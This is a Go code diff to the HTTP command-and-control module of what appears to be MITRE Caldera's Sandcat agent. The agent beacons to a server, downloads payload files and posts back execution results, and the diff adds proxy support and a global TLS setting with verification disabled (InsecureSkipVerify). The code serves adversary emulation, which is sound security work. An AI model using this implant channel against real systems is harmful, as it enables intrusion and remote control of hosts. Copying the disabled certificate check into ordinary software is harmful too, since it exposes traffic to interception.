@@ -2,11 +2,13 @@ package contact
 
 import (
 	"bytes"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"net/url"
 	"path/filepath"
 
 	"github.com/mitre/gocat/output"
@@ -19,26 +21,27 @@ var (
 //API communicates through HTTP
 type API struct {
 	name string
+	client *http.Client
 }
 
 func init() {
-	CommunicationChannels["HTTP"] = API{ name: "HTTP" }
+	CommunicationChannels["HTTP"] = &API{ name: "HTTP" }
 }
 
 //GetInstructions sends a beacon and returns response.
-func (a API) GetBeaconBytes(profile map[string]interface{}) []byte {
+func (a *API) GetBeaconBytes(profile map[string]interface{}) []byte {
 	data, err := json.Marshal(profile)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Cannot request beacon. Error with profile marshal: %s", err.Error()))
 		return nil
 	} else {
 		address := fmt.Sprintf("%s%s", profile["server"], apiBeacon)
-		return request(address, data)
+		return a.request(address, data)
 	}
 }
 
 // Return the file bytes for the requested payload.
-func (a API) GetPayloadBytes(profile map[string]interface{}, payload string) ([]byte, string) {
+func (a *API) GetPayloadBytes(profile map[string]interface{}, payload string) ([]byte, string) {
     var payloadBytes []byte
     var filename string
     server := profile["server"]
@@ -53,8 +56,7 @@ func (a API) GetPayloadBytes(profile map[string]interface{}, payload string) ([]
 		req.Header.Set("file", payload)
 		req.Header.Set("platform", platform.(string))
 		req.Header.Set("paw", profile["paw"].(string))
-		client := &http.Client{}
-		resp, err := client.Do(req)
+		resp, err := a.client.Do(req)
 		if err != nil {
 			output.VerbosePrint(fmt.Sprintf("[-] Error sending payload request: %s", err.Error()))
 			return nil, ""
@@ -78,13 +80,26 @@ func (a API) GetPayloadBytes(profile map[string]interface{}, payload string) ([]
 }
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
-func (a API) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
+func (a *API) C2RequirementsMet(profile map[string]interface{}, c2Config map[string]string) (bool, map[string]string) {
 	output.VerbosePrint(fmt.Sprintf("Beacon API=%s", apiBeacon))
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+
+	// Handle proxy gateway configuration.
+	if proxyUrlStr, ok := c2Config["httpProxyGateway"]; ok && len(proxyUrlStr) > 0 {
+		proxyUrl, err := url.Parse(proxyUrlStr)
+		if err != nil {
+			output.VerbosePrint(fmt.Sprintf("[!] Error - could not establish HTTP proxy requirements: %s", err.Error()))
+			return false, nil
+		}
+		http.DefaultTransport.(*http.Transport).Proxy = http.ProxyURL(proxyUrl)
+	}
+	a.client = &http.Client{Transport: http.DefaultTransport}
+
 	return true, nil
 }
 
 //SendExecutionResults will send the execution results to the server.
-func (a API) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
+func (a *API) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
 	address := fmt.Sprintf("%s%s", profile["server"], apiBeacon)
 	profileCopy := make(map[string]interface{})
 	for k,v := range profile {
@@ -97,23 +112,22 @@ func (a API) SendExecutionResults(profile map[string]interface{}, result map[str
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Cannot send results. Error with profile marshal: %s", err.Error()))
 	} else {
-		request(address, data)
+		a.request(address, data)
 	}
 }
 
-func (a API) GetName() string {
+func (a *API) GetName() string {
 	return a.name
 }
 
-func request(address string, data []byte) []byte {
+func (a *API) request(address string, data []byte) []byte {
 	encodedData := []byte(base64.StdEncoding.EncodeToString(data))
 	req, err := http.NewRequest("POST", address, bytes.NewBuffer(encodedData))
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Failed to create HTTP request: %s", err.Error()))
 		return nil
 	}
-	client := &http.Client{}
-	resp, err := client.Do(req)
+	resp, err := a.client.Do(req)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Failed to perform HTTP request: %s", err.Error()))
 		return nil
